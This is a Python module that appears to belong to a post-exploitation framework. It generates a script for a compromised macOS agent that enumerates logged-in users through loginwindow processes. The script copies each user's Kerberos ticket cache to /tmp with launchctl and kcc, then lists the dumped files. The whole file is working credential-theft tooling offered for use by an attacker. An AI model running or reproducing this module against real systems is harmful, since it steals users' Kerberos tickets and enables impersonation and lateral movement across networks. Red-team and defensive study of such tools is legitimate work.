from lib.common import helpers


class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Dump Kerberos Tickets',

            # list of one or more authors for the module
            'Author': ['@424f424f,@gentilkiwi'],

            # more verbose multi-line description of the module
            'Description': ('This module will dump ccache kerberos'
                            'tickets to the specified directory'),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': None,

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': [
                'Thanks to @gentilkiwi for pointing this out!'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to grab a tickets from.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        script = """
import subprocess
kerbdump = \"""
ps auxwww |grep /loginwindow |grep -v "grep /loginwindow" |while read line
do
    USER=`echo "$line" | awk '{print $1}'`
    PID=`echo "$line" | awk '{print $2}'`
    USERID=`id -u "$USER"`
    launchctl asuser $USERID kcc copy_cred_cache /tmp/$USER.ccache
done
""\"
try:
    print "Executing..."
    output = subprocess.Popen(kerbdump, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read()
    print output
except Exception as e:
    print e
try:
    print "Listing available kerberos files.."
    output = subprocess.Popen('ls /tmp/*.ccache', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read()
    print output
except Exception as e:
    print e
"""
        return script